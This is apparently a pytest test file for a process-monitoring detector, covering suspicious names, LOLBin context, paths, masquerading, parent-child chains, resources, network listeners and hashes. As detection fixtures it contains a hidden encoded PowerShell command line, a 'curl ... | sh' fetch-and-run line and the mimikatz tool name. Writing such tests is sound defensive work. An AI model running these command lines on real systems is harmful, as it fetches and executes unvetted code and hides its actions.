"""Detection rules: names, LOLBin context, command lines, paths, masquerading,
parent-child, resources, network and hashes."""
import hashlib

import pytest

from modules.behavior_detector import BehaviorDetector
from modules.hash_analyzer import HashAnalyzer
from modules.network_monitor import Connection, NetworkAnalyzer, ip_scope
from modules.process_analyzer import ProcessAnalyzer, osa_distance
from modules.process_tree import ProcessTree, RelationshipAnalyzer
from modules.risk_scorer import RiskScorer

W32 = "C:\\Windows\\System32\\"


def rules_of(findings):
    return {f.rule for f in findings}


# ----------------------------------------------------------------- names
def test_offensive_tool_name_flagged(rules, make_proc):
    f = ProcessAnalyzer(rules).check_name(make_proc("mimikatz.exe", "C:\\Users\\bob\\Desktop\\mimikatz.exe"))
    assert rules_of(f) == {"suspicious_name"}


def test_name_match_is_case_insensitive(rules, make_proc):
    assert ProcessAnalyzer(rules).check_name(make_proc("NC.EXE", "C:\\tools\\NC.EXE"))


def test_test_rule_name(rules, make_proc):
    f = ProcessAnalyzer(rules).check_name(make_proc("spd_test_tool", "/opt/x/spd_test_tool"))
    assert f and "TEST RULE" in f[0].category


def test_script_name_matches_name_rule(rules, make_proc):
    p = make_proc("python3", "/usr/bin/python3", ["python3", "spd_test_tool.py"], cwd="/home/a")
    assert ProcessAnalyzer(rules).check_name(p)


def test_normal_names_not_flagged(rules, make_proc):
    a = ProcessAnalyzer(rules)
    for n in ("bash", "sshd", "chrome.exe", "explorer.exe", "python3", "svchost.exe"):
        assert not a.check_name(make_proc(n, "/usr/bin/" + n)), n


# ----------------------------------------------------------------- LOLBin context
def test_powershell_alone_scores_zero(rules, make_proc, cfg):
    """Legitimate Windows utility with no other evidence must NOT be scored."""
    p = make_proc("powershell.exe", W32 + "WindowsPowerShell\\v1.0\\powershell.exe", parent_name="explorer.exe")
    a = ProcessAnalyzer(rules)
    res = RiskScorer(cfg).score(a.analyze(p))
    assert res.score == 0
    assert res.severity == "NONE"
    assert any("needs context" in c for _, _, c in res.scored)


def test_powershell_with_office_parent_scores(rules, make_proc, cfg):
    word = make_proc("WINWORD.EXE", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", pid=10)
    ps = make_proc("powershell.exe", W32 + "WindowsPowerShell\\v1.0\\powershell.exe", ppid=10)
    tree = ProcessTree([word, ps])
    f = ProcessAnalyzer(rules).analyze(ps) + RelationshipAnalyzer(rules).check(ps, tree)
    res = RiskScorer(cfg).score(f)
    assert "suspicious_parent_child" in rules_of(f)
    assert res.score == 25 + 20          # relationship + LOLBin now in context
    assert res.severity == "HIGH"


def test_encoded_powershell_cmdline(rules, make_proc, cfg):
    p = make_proc("powershell.exe", W32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                  ["powershell.exe", "-nop", "-w", "hidden", "-enc", "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"])
    f = ProcessAnalyzer(rules).analyze(p)
    assert "suspicious_cmdline" in rules_of(f)
    assert RiskScorer(cfg).score(f).score == 15 + 20


def test_shell_dash_e_not_mistaken_for_powershell(rules, make_proc):
    p = make_proc("sh", "/usr/bin/dash", ["sh", "-c", "grep -e /usr/local/bin/environment-manager x"])
    assert not ProcessAnalyzer(rules).check_cmdline(p)


def test_cmdline_evidence_is_redacted(rules, make_proc):
    p = make_proc("bash", "/usr/bin/bash", ["bash", "-c", "curl -H 'x' --token s3cr3tvalue http://h/a | sh"])
    f = ProcessAnalyzer(rules).check_cmdline(p)
    assert f
    assert "s3cr3tvalue" not in f[0].evidence
    assert "[REDACTED]" in f[0].evidence


# ----------------------------------------------------------------- paths
@pytest.mark.parametrize("exe,rule", [
    ("/tmp/x/payload", "temp_directory_execution"),
    ("/dev/shm/a", "temp_directory_execution"),
    ("C:\\Users\\bob\\AppData\\Local\\Temp\\setup.exe", "temp_directory_execution"),
    ("C:\\Users\\bob\\Downloads\\tool.exe", "user_writable_execution"),
    ("C:\\Users\\bob\\AppData\\Roaming\\upd\\upd.exe", "user_writable_execution"),
    ("/home/bob/.cache/.x/run", "hidden_directory_execution"),
])
def test_unusual_locations(rules, make_proc, exe, rule):
    assert rule in rules_of(ProcessAnalyzer(rules).check_path(make_proc("t", exe, username="bob")))


@pytest.mark.parametrize("exe", ["/usr/bin/python3", "/usr/sbin/sshd", W32 + "svchost.exe",
                                 "C:\\Program Files\\Mozilla Firefox\\firefox.exe"])
def test_trusted_locations_clean(rules, make_proc, exe):
    a = ProcessAnalyzer(rules)
    assert a.location_class(exe) == "trusted"
    assert not [f for f in a.check_path(make_proc("t", exe)) if f.rule != "missing_executable"]


def test_script_from_temp_detected(rules, make_proc):
    p = make_proc("python3", "/usr/bin/python3", ["python3", "app.py"], cwd="/tmp/spd_test_1")
    f = ProcessAnalyzer(rules).check_path(p)
    assert rules_of(f) == {"temp_directory_execution"}
    assert "/tmp/spd_test_1/app.py" in f[0].evidence


def test_python_dash_c_has_no_script(rules, make_proc):
    p = make_proc("python3", "/usr/bin/python3", ["python3", "-c", "print(1)"], cwd="/tmp")
    assert ProcessAnalyzer(rules).script_path(p) == ""


def test_root_from_temp_adds_elevated(rules, make_proc):
    f = ProcessAnalyzer(rules).check_path(make_proc("x", "/tmp/x", username="root"))
    assert {"temp_directory_execution", "elevated_unusual_location"} <= rules_of(f)


def test_deleted_and_memfd_executables(rules, make_proc):
    a = ProcessAnalyzer(rules)
    assert "missing_executable" in rules_of(a.check_path(make_proc("x", "/usr/bin/x", deleted=True)))
    f = a.check_path(make_proc("6", "/memfd:abc"))
    assert f[0].category.startswith("Fileless")


# ----------------------------------------------------------------- masquerading
def test_svchost_outside_system32(rules, make_proc):
    f = ProcessAnalyzer(rules).check_masquerade(make_proc("svchost.exe", "C:\\Users\\Public\\svchost.exe"))
    assert rules_of(f) == {"masquerading"}


def test_svchost_in_system32_ok(rules, make_proc):
    assert not ProcessAnalyzer(rules).check_masquerade(make_proc("svchost.exe", W32 + "svchost.exe"))


@pytest.mark.parametrize("name", ["svch0st.exe", "scvhost.exe", "lsas.exe"])
def test_lookalike_names(rules, make_proc, name):
    f = ProcessAnalyzer(rules).check_masquerade(make_proc(name, "C:\\ProgramData\\" + name))
    assert f and "Look-alike" in f[0].category


def test_linux_short_names_no_lookalike_noise(rules, make_proc):
    a = ProcessAnalyzer(rules)
    for n in ("ssh", "crond", "systemd-journald"):
        assert not a.check_masquerade(make_proc(n, "/usr/bin/" + n)), n


def test_masquerade_needs_path(rules, make_proc):
    assert not ProcessAnalyzer(rules).check_masquerade(make_proc("lsass.exe", ""))


def test_osa_distance():
    assert osa_distance("svchost", "scvhost") == 1
    assert osa_distance("abc", "abc") == 0
    assert osa_distance("kitten", "sitting") == 3


# ----------------------------------------------------------------- parent-child
def test_tree_and_chain(make_proc):
    a = make_proc("init", "/sbin/init", pid=1, ppid=0)
    b = make_proc("bash", "/usr/bin/bash", pid=2, ppid=1)
    c = make_proc("python3", "/usr/bin/python3", pid=3, ppid=2)
    t = ProcessTree([a, b, c])
    assert t.chain_text(3) == "init(1) -> bash(2) -> python3(3)"
    assert [p.pid for p in t.descendants(1)] == [2, 3] or {p.pid for p in t.descendants(1)} == {2, 3}
    txt = t.render({3: "HIGH"})
    assert "python3 [3]  <== [HIGH]" in txt
    assert "(parent of flagged)" in txt


def test_tree_cycle_safe(make_proc):
    a = make_proc("a", "/a", pid=5, ppid=6)
    b = make_proc("b", "/b", pid=6, ppid=5)
    assert len(ProcessTree([a, b]).ancestors(5)) <= 2


def test_browser_spawning_wscript(rules, make_proc):
    ch = make_proc("chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", pid=20)
    ws = make_proc("wscript.exe", W32 + "wscript.exe", ppid=20)
    assert RelationshipAnalyzer(rules).check(ws, ProcessTree([ch, ws]))


def test_interpreter_script_name_as_parent(rules, make_proc):
    par = make_proc("python3", "/usr/bin/python3", ["python3", "/x/spd_office_sim.py"], pid=30)
    ch = make_proc("sh", "/usr/bin/dash", ["sh", "-c", "sleep 1"], ppid=30)
    f = RelationshipAnalyzer(rules, ProcessAnalyzer(rules)).check(ch, ProcessTree([par, ch]))
    assert f and "spd_office_sim" in f[0].evidence


def test_normal_relationship_not_flagged(rules, make_proc):
    par = make_proc("bash", "/usr/bin/bash", pid=40)
    ch = make_proc("ls", "/usr/bin/ls", ppid=40)
    assert not RelationshipAnalyzer(rules).check(ch, ProcessTree([par, ch]))


# ----------------------------------------------------------------- resources
def test_sustained_cpu_requires_duration(cfg, make_proc):
    b = BehaviorDetector(cfg)
    p = make_proc("miner", "/usr/bin/miner", cpu=99.0)
    f0 = b.check_resources(p, now=1000)
    assert rules_of(f0) == {"high_resource"} and f0[0].requires_context
    f1 = b.check_resources(p, now=1000 + cfg["cpu_duration_seconds"])
    assert "sustained_high_cpu" in rules_of(f1)


def test_cpu_drop_resets_timer(cfg, make_proc):
    b = BehaviorDetector(cfg)
    hot = make_proc("x", "/usr/bin/x", cpu=99.0, pid=77)
    cold = make_proc("x", "/usr/bin/x", cpu=1.0, pid=77)
    b.check_resources(hot, now=0)
    b.check_resources(cold, now=20)
    assert "sustained_high_cpu" not in rules_of(b.check_resources(hot, now=35))


def test_cpu_spike_alone_scores_zero(cfg, make_proc):
    f = BehaviorDetector(cfg).check_resources(make_proc("x", "/usr/bin/x", cpu=99.0), now=0)
    assert RiskScorer(cfg).score(f).score == 0


def test_memory_and_threads(cfg, make_proc):
    f = BehaviorDetector(cfg).check_resources(make_proc("x", "/usr/bin/x", mem=85.0, threads=900))
    assert {"high_memory", "high_thread_count"} <= rules_of(f)


def test_allowlisted_heavy_app_informational(cfg, make_proc):
    p = make_proc("firefox", "/usr/lib/firefox/firefox", cpu=150.0, mem=90.0)
    b = BehaviorDetector(cfg)
    b.check_resources(p, now=0)
    f = b.check_resources(p, now=100)
    assert {"sustained_high_cpu", "high_memory"} <= rules_of(f)
    assert RiskScorer(cfg).score(f).score == 0


def test_rapid_process_creation(cfg, make_proc):
    parent = make_proc("loop", "/usr/bin/loop", pid=500)
    events = [(1000 + i * 0.1, 600 + i, "sleep", 500) for i in range(25)]
    out = BehaviorDetector(cfg).check_process_creation(events, {500: parent}, now=1003)
    assert 500 in out and out[500][0].rule == "rapid_process_creation"


def test_slow_creation_not_flagged(cfg, make_proc):
    parent = make_proc("cron", "/usr/sbin/cron", pid=501)
    events = [(1000 + i * 5, 700 + i, "job", 501) for i in range(25)]   # 1 every 5 s
    assert not BehaviorDetector(cfg).check_process_creation(events, {501: parent}, now=1125)


# ----------------------------------------------------------------- network
def conn(pid, status, lip="0.0.0.0", lport=0, rip="", rport=None):
    return Connection(pid, "TCP", lip, lport, rip, rport, status, ip_scope(rip))


def test_ip_scope():
    assert ip_scope("127.0.0.1") == "loopback"
    assert ip_scope("10.1.2.3") == "private"
    assert ip_scope("8.8.8.8") == "public"
    assert ip_scope("fe80::1") == "link-local"
    assert ip_scope("") == "none"
    assert ip_scope("garbage") == "unknown"


def test_unexpected_listener(cfg, make_proc):
    p = make_proc("svc", "/usr/bin/svc")
    f = NetworkAnalyzer(cfg).check(p, [conn(p.pid, "LISTEN", "0.0.0.0", 4444)], True)
    assert f and f[0].weight_factor == 1.0


def test_loopback_listener_half_weight(cfg, make_proc):
    p = make_proc("svc", "/usr/bin/svc")
    f = NetworkAnalyzer(cfg).check(p, [conn(p.pid, "LISTEN", "127.0.0.1", 8765)], True)
    assert f[0].weight_factor == 0.5
    assert RiskScorer(cfg).score(f).score == round(cfg["risk_weights"]["unusual_network"] * 0.5)


def test_allowed_port_and_process(cfg, make_proc):
    n = NetworkAnalyzer(cfg)
    p = make_proc("nginx", "/usr/sbin/nginx")
    assert not n.check(p, [conn(p.pid, "LISTEN", "0.0.0.0", 443)], True)
    s = make_proc("sshd", "/usr/sbin/sshd")
    assert not n.check(s, [conn(s.pid, "LISTEN", "0.0.0.0", 2222)], True)


def test_untrusted_exe_external_connection(cfg, make_proc):
    p = make_proc("upd", "/home/a/Downloads/upd")
    f = NetworkAnalyzer(cfg).check(p, [conn(p.pid, "ESTABLISHED", "10.0.0.5", 50000, "93.184.216.34", 443)], False)
    assert f and "NOT known to be malicious" in f[0].description


def test_trusted_exe_external_connection_ok(cfg, make_proc):
    p = make_proc("curl", "/usr/bin/curl")
    assert not NetworkAnalyzer(cfg).check(p, [conn(p.pid, "ESTABLISHED", "10.0.0.5", 1, "93.184.216.34", 443)], True)


def test_many_connections(cfg, make_proc):
    p = make_proc("x", "/usr/bin/x")
    cs = [conn(p.pid, "ESTABLISHED", "10.0.0.5", 1000 + i, "10.0.0.9", 80) for i in range(cfg["connection_threshold"])]
    assert NetworkAnalyzer(cfg).check(p, cs, True)


# ----------------------------------------------------------------- hashes
def test_sha256_and_cache(tmp_path):
    f = tmp_path / "tool.bin"
    f.write_bytes(b"harmless test content")
    h = HashAnalyzer({})
    sha, st = h.sha256(str(f))
    assert sha == hashlib.sha256(b"harmless test content").hexdigest() and st == "ok"
    assert h.sha256(str(f)) == (sha, "cached")


def test_hash_recomputed_after_change(tmp_path):
    f = tmp_path / "tool.bin"
    f.write_bytes(b"v1")
    h = HashAnalyzer({})
    a, _ = h.sha256(str(f))
    f.write_bytes(b"v2 longer")
    b, st = h.sha256(str(f))
    assert a != b and st == "ok"


def test_hash_missing_and_too_large(tmp_path):
    h = HashAnalyzer({}, max_mb=1)
    assert h.sha256(str(tmp_path / "nope")) == (None, "missing")
    big = tmp_path / "big"
    big.write_bytes(b"0" * (2 * 1024 * 1024))
    assert h.sha256(str(big)) == (None, "too_large")


def test_unknown_hash_only_outside_trusted(make_proc):
    h = HashAnalyzer({})
    p = make_proc("x", "/tmp/x")
    assert rules_of(h.findings(p, "a" * 64, False, None)) == {"unknown_hash_untrusted_location"}
    assert not h.findings(p, "a" * 64, True, None)


def test_known_good_and_bad(make_proc):
    h = HashAnalyzer({"known_good": {"g" * 64: "ok"}, "known_bad": {"b" * 64: {"source": "internal IR case 12"}}})
    p = make_proc("x", "/tmp/x")
    assert not h.findings(p, "g" * 64, False, None)
    f = h.findings(p, "b" * 64, False, None)
    assert rules_of(f) == {"known_bad_hash"} and "internal IR case 12" in f[0].description


def test_hash_changed_between_sessions(make_proc):
    f = HashAnalyzer({}).findings(make_proc("x", "/usr/bin/x"), "1" * 64, True, "2" * 64)
    assert rules_of(f) == {"hash_changed"}


def test_add_known_good_writes_file(tmp_path):
    kp = tmp_path / "known.json"
    h = HashAnalyzer({}, known_path=kp)
    assert h.add_known_good({"c" * 64: "baseline"}) == 1
    assert "c" * 64 in kp.read_text()
